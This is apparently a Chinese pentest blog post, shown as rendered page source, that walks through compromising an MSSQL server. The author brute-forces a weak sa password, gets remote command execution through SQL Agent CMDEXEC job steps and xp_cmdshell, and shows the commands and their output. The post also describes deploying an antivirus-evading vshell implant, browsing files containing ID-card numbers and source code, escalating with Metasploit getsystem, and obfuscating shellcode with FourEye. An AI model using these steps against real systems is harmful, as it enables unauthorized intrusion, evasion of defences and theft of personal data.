<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>功能​</strong>​：添加清理步骤</li><li>​<strong>​作用​</strong>​：删除第一步生成的临时文件</li><li>​<strong>​参数​</strong>​： <ul><li><code>@on_success_action = 1</code>：成功后退出报告成功</li></ul></li></ul><p>以上就是设置<code>agent</code>的主要命令，接下来是一些必要命令:<br> 绑定作业到服务器：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_add_jobserver</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    @server_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> N&#39;(local)&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>功能​</strong>​：将作业附加到本地服务器实例</li><li>​<strong>​必需步骤​</strong>​：否则作业无法运行</li></ul><p>启动作业：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">sp_start_job</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Job </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;SystemMaintenance&#39;</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> started</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> successfully.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">return</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>​<strong>​功能​</strong>​：立即启动作业</li><li>​<strong>​输出​</strong>​：成功启动确认<br> 后来使用简化版步骤，只需要把第一步的重定向删除即可，因为<code>sql agent</code>会自动捕获标准输出</li></ul><h3 id="检查步骤" tabindex="-1"><a class="header-anchor" href="#检查步骤"><span>检查步骤</span></a></h3><p>检查作业状态</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">EXEC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> msdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.sp_help_job </span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">@job_name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">GO</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>这次输出的形式较为混乱<br> 以下是格式化后的查询结果输出：</p><table><thead><tr><th>字段</th><th>值</th></tr></thead><tbody><tr><td>​<strong>​Core Job Details​</strong>​</td><td></td></tr><tr><td>job_id</td><td>791449ED-1595-4170-BA3C-937FDEBA778A</td></tr><tr><td>originating_server</td><td>ZHANGWEI</td></tr><tr><td>name</td><td>SystemMaintenance</td></tr><tr><td>enabled</td><td>1 (启用)</td></tr><tr><td>description</td><td>System maintenance tasks</td></tr><tr><td>start_step_id</td><td>1</td></tr><tr><td>category</td><td>[Uncategorized (Local)]</td></tr><tr><td>owner</td><td>sa</td></tr><tr><td>notify_level_eventlog</td><td>2</td></tr><tr><td>date_created</td><td>Oct 13 2025 08:57PM</td></tr><tr><td>date_modified</td><td>Oct 13 2025 08:58PM</td></tr><tr><td>last_run_date</td><td>20251013</td></tr><tr><td>last_run_time</td><td>205821</td></tr><tr><td>last_run_outcome</td><td>1 (成功)</td></tr><tr><td>current_execution_status</td><td>4 (空闲)</td></tr><tr><td>​<strong>​Job Steps​</strong>​</td><td></td></tr><tr><td>step_id</td><td>1, 2, 3</td></tr><tr><td>step_name</td><td>RunWhoami, CaptureOutput, Cleanup</td></tr><tr><td>subsystem</td><td>CMDEXEC, TSQL, CMDEXEC</td></tr><tr><td>​<strong>​Job Schedules​</strong>​</td><td>无</td></tr></tbody></table><p>​<strong>​说明​</strong>​：</p><ul><li><code>last_run_outcome=1</code>表示作业最后一次运行成功</li><li><code>current_execution_status=4</code>表示作业当前空闲</li><li>步骤顺序：RunWhoami → CaptureOutput → Cleanup</li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SELECT description </span></span>
<span class="line"><span>FROM msdb.dbo.sysjobs</span></span>
<span class="line"><span>WHERE name = &#39;SystemMaintenance&#39;;</span></span>
<span class="line"><span>GO</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><table><thead><tr><th>description</th></tr></thead><tbody><tr><td>System maintenance tasks</td></tr></tbody></table><p>​<strong>关键发现​</strong>​：<br> 描述仍为初始值，证明第二步（CaptureOutput）未能成功更新作业描述</p><p><code>sp_help_jobhistory</code>作业历史记录</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>EXEC msdb.dbo.sp_help_jobhistory @job_name = &#39;SystemMaintenance&#39;;</span></span>
<span class="line"><span>GO</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><table><thead><tr><th>字段</th><th>值</th></tr></thead><tbody><tr><td>​<strong>​Job History​</strong>​</td><td></td></tr><tr><td>job_id</td><td>791449ED-1595-4170-BA3C-937FDEBA778A</td></tr><tr><td>job_name</td><td>SystemMaintenance</td></tr><tr><td>run_status</td><td>1 (成功)</td></tr><tr><td>run_date</td><td>20251013</td></tr><tr><td>run_time</td><td>205821</td></tr><tr><td>run_duration</td><td>0 (秒)</td></tr><tr><td>retries_attempted</td><td>0</td></tr><tr><td>server</td><td>ZHANGWEI</td></tr></tbody></table><p><strong>​关键分析​</strong>​：</p><p>. 所有步骤都报告成功（run_status=1）</p><p>. run_duration=0 表示执行时间过短未被记录</p><p>. 存在两条相同记录（可能因多步骤生成）</p><h2 id="查看回显" tabindex="-1"><a class="header-anchor" href="#查看回显"><span>查看回显</span></a></h2><p>首先获得<code>job_id</code>:</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">SELECT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> job_id</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">FROM</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> msdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.sysjobs</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">WHERE</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;SystemMaintenance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">go</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> job_id</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> ------------------------------------ </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> 791449ED-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1595</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4170</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-BA3C-937FDEBA778A</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查询命令执行历史（包含命令执行回显）：</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">SELECT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> step_id, step_name, run_status, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">message</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">FROM</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> msdb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.sysjobhistory</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">WHERE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> job_id </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;791449ED-1595-4170-BA3C-937FDEBA778A&#39;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">ORDER BY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> run_date </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">DESC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, run_time </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">DESC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在查询结果中，<code>message</code>列包含完整的命令输出</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">已以用户</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> WORKGROUP</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\Z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">HANGWEI</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$ </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">的身份执行。</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">nt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> authority</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">etwork</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> service.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">-</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 这是命令的实际输出</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">进程退出代码</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 0。.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">该步骤成功。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>agent</code>功能成功捕获了<em><strong>简化版本的步骤</strong></em>的标准输出结果。<br> 至此<code>agent</code> RCE已经成功</p><h2 id="xp-cmdshell玄学问题" tabindex="-1"><a class="header-anchor" href="#xp-cmdshell玄学问题"><span>xp_cmdshell玄学问题</span></a></h2><p>经过多次实验，发现xp_cmdshell真的很玄学，有时候启用了xp_cmdshell会返回code5，但是在随便执行查询语句后（最好进行系统数据库查询）就又可以执行xp_cmdshell，有时候在关掉xp_cmdshell后再开启，又返回code5。但有时候关闭再打开仍然正常，真的很玄学，那么我们接下来就该进行弹shell以及其他操作。<br> 这里我使用vshell，vshell可以方便的进行文件上传和其他各种功能，比如插件还有自启动之类的，管理也很方便<br> 随后通过<code>tasklist</code>发现又杀软在运行，好在市面上vshell的免杀加载器比较丰富，于是直接传马，成功上线<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251016193931.png" alt="image.png" loading="lazy"><br> 随后翻看存储文件，发现了许多价值信息，身份证号还有各种项目源码，各种其他内容。<br> 进一步渗透可以尝试远程桌面，但是添加用户需要提权，这里的提权我选择转到msf框架下，msf的一键提权<code>getsysterm</code>很方便，并且拥有systerm权限后再把shell弹回vshell就可以用很多插件，以及方便的添加自启动了。<br> 需要注意的是，msf生成的shellcode并不免杀，所以我们需要结合市面上的工具进行免杀处理，我选择了FourEye进行免杀处理<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251016212635.png" alt="image.png" loading="lazy"></p>`,63)]))}const d=i(l,[["render",t],["__file","从mssql到rdp远程桌面连接.html.vue"]]),r=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/%E9%A1%B9%E7%9B%AE__%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E5%8C%85/%E5%AE%9E%E6%88%98/%E4%BB%8Emssql%E5%88%B0rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5.html","title":"从mssql到rdp远程桌面连接","lang":"zh-CN","frontmatter":{"aliases":null,"cssclasses":null,"tags":null,"icon":"pen-to-square","date":"2025-10-16T00:00:00.000Z","title":"从mssql到rdp远程桌面连接","category":["项目"],"description":"开端 image.pngimage.png fscan扫描，爆出mssql弱密码san:1 使用sqsh连接mssql 首次xp_cmdshellRCE尝试 为了执行命令，首先查看最短最方便的路径xp_cmdshell命令执行 启动xp_cmdshell 查询xp_cmdshell是否启用 显示已经启用 但是在命令执行时却出现问题 错误代码5，这表示“...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/%E9%A1%B9%E7%9B%AE__%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E5%8C%85/%E5%AE%9E%E6%88%98/%E4%BB%8Emssql%E5%88%B0rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"从mssql到rdp远程桌面连接"}],["meta",{"property":"og:description","content":"开端 image.pngimage.png fscan扫描，爆出mssql弱密码san:1 使用sqsh连接mssql 首次xp_cmdshellRCE尝试 为了执行命令，首先查看最短最方便的路径xp_cmdshell命令执行 启动xp_cmdshell 查询xp_cmdshell是否启用 显示已经启用 但是在命令执行时却出现问题 错误代码5，这表示“..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251018211716.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-11-25T07:43:36.000Z"}],["meta",{"property":"article:published_time","content":"2025-10-16T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-11-25T07:43:36.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"从mssql到rdp远程桌面连接\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251018211716.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251016193931.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251016212635.png\\"],\\"datePublished\\":\\"2025-10-16T00:00:00.000Z\\",\\"dateModified\\":\\"2025-11-25T07:43:36.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"开端","slug":"开端","link":"#开端","children":[]},{"level":2,"title":"首次xp_cmdshellRCE尝试","slug":"首次xp-cmdshellrce尝试","link":"#首次xp-cmdshellrce尝试","children":[]},{"level":2,"title":"SQL Agent 作业RCE","slug":"sql-agent-作业rce","link":"#sql-agent-作业rce","children":[{"level":3,"title":"准备步骤","slug":"准备步骤","link":"#准备步骤","children":[]},{"level":3,"title":"（复杂）添加作业步骤","slug":"复杂-添加作业步骤","link":"#复杂-添加作业步骤","children":[]},{"level":3,"title":"检查步骤","slug":"检查步骤","link":"#检查步骤","children":[]}]},{"level":2,"title":"查看回显","slug":"查看回显","link":"#查看回显","children":[]},{"level":2,"title":"xp_cmdshell玄学问题","slug":"xp-cmdshell玄学问题","link":"#xp-cmdshell玄学问题","children":[]}],"git":{"createdTime":1762845999000,"updatedTime":1764056616000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":94,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":5.43,"words":1630},"filePathRelative":"article/01_项目/项目__渗透经验包/实战/从mssql到rdp远程桌面连接.md","localizedDate":"2025年10月16日","excerpt":"<h2>开端</h2>\\n<figure><img src=\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20251018211716.png\\" alt=\\"image.png\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image.png</figcaption></figure>\\n<p><code>fscan</code>扫描，爆出<code>mssql</code>弱密码<code>san:1</code><br>\\n使用sqsh连接mssql</p>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">sqsh</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -S</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> 10.99.xx.xx</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -U</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> sa</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -P</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 1</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{d as comp,r as data};
